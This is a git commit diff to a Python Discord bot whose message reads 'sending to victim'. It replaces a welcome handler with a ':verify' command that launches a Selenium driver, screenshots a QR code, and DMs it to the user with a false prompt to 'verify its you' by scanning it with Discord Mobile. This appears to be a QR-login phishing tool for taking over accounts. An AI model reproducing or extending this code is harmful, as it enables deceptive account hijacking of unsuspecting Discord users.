7924f28b56f75eea2839acb34d17ab6e0ee3126a
Prashant <prashantrahul141@protonmail.com>
2023-05-02 14:16:08 +0530

    add: basic embed generate and sending to victim

--- Bot.py
+++ Bot.py
@@ -1,13 +1,24 @@
 import discord
 from logger import logger
+from SeleniumDriver import SeleniumDriver
 
 
 class Client(discord.Client):
     async def on_ready(self):
         logger.info("bot ready.")
 
-    async def on_member_join(self, member):
-        guild = member.guild
-        if guild.system_channel is not None:
-            to_send = f'Welcome {member.mention} to {guild.name}!'
-            await guild.system_channel.send(to_send)
+    async def on_message(self, message: discord.Message):
+        if not message.author.bot and message.content == ":verify":
+            logger.info(f"Verify Message Recieved from : {message.author}")
+
+            self.driver = SeleniumDriver()
+            self.driver.start()
+
+            logger.info("Creating embed.")
+            file = discord.File("screenshots/qr.png", filename="qr.png")
+            embed = discord.Embed(title="Verify", description="Verify its you by scanning the given QR code using Discord Mobile.",
+                                  color=discord.Color.blue)
+            embed.set_image(url="attachment://qr.png")
+
+            logger.info("sending embed.")
+            await message.author.send(file=file, embed=embed)
